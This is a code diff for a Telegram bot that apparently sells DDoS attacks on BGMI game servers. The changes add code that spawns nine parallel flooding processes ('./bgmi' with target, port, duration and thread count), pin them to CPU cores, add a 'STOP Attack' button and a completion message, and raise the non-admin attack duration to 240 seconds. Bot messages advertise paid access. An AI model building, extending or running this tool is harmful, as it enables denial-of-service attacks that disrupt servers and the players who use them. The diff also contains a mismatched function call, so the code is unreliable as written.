@@ -11,6 +11,8 @@ import tempfile
 
 DB_FILE = 'bot_data.db'
 keep_alive()
+Attack = {}
+
 if not os.path.exists(DB_FILE):
     initialize_db()
 
@@ -377,11 +379,26 @@ def initialize_bot(bot, bot_id):
         response = f"🤖Your ID: {user_id}"
         bot.reply_to(message, response)
     
-    def start_attack_reply(message, target, port, time):
+    def start_attack_reply(message, target, port, time, owner_name):
         user_info = message.from_user
         username = user_info.username if user_info.username else user_info.first_name
+        chat_id = message.chat.id
+        global Attack
+        threads_per_instance = 100
+        num_instances = (900 // threads_per_instance)
+        core_mapping = [0, 0, 1, 1, 0, 0, 1, 1, 0]
+        for i in range(num_instances):
+            full_command = ['nohup', './bgmi', str(target), str(port), str(time), str(threads_per_instance)]
+            core = core_mapping[i % len(core_mapping)]
+            taskset_command = ['taskset', '-c', str(core)] + full_command
+            attack_process = subprocess.Popen(taskset_command)
+            Attack[chat_id] = attack_process
+        scheduled_time = datetime.now() + timedelta(seconds=time)
+        Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
+        markup = InlineKeyboardMarkup()
+        markup.add(InlineKeyboardButton("STOP Attack", callback_data="stop_attack_" + str(chat_id)))
         response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
-        bot.reply_to(message, response)
+        bot.reply_to(message, response, reply_markup=markup)
     
     bgmi_cooldown = {}
     COOLDOWN_TIME =0
@@ -404,19 +421,40 @@ def initialize_bot(bot, bot_id):
                 target = command[1]
                 port = int(command[2])
                 time = int(command[3])
-                if user_id not in allowed_admin_ids and time > 180:
-                    response = "Error: Time interval must be less than 180."
+                if user_id not in allowed_admin_ids and time > 240:
+                    response = "Error: Time interval must be less than 240."
                 else:
                     log_command(user_id, target, port, time, '/bgmi')
                     start_attack_reply(message, target, port, time)  
-                    full_command = f"./bgmi {target} {port} {time} 900"
-                    subprocess.run(full_command, shell=True)
-                    response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {time} Seconds\n\n👛Dm to Buy : {owner_name}"
             else:
                 response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
         else:
             response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
         bot.reply_to(message, response)
+    
+    def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
+        global Attack
+        chat_id = message.chat.id
+        while datetime.now() < scheduled_time:
+            time.sleep(1)
+        if chat_id in Attack and Attack[chat_id] is not None:
+            response = f"☣️BGMI D-DoS Attack Finished.\n\nTarget: {target} Port: {port} Time: {attack_time} Seconds\n\n👛Dm to Buy : {owner_name}"
+            bot.reply_to(message, response)
+    
+    @bot.callback_query_handler(func=lambda call: call.data.startswith("stop_attack_"))
+    def handle_callback_query(call):
+        chat_id = int(call.data.split("_")[-1])
+        if chat_id in Attack and Attack[chat_id] is not None:
+            Attack[chat_id].kill()
+            try:
+                Attack[chat_id].wait(timeout=5)
+                response = "Attack stopped successfully."
+            except subprocess.TimeoutExpired:
+                response = "Failed to stop the attack in time."
+            Attack[chat_id] = None
+        else:
+            response = "No running attacks to be stopped."
+        bot.reply_to(call.message, response)
     
     @bot.message_handler(commands=['help'])
     def show_help(message):
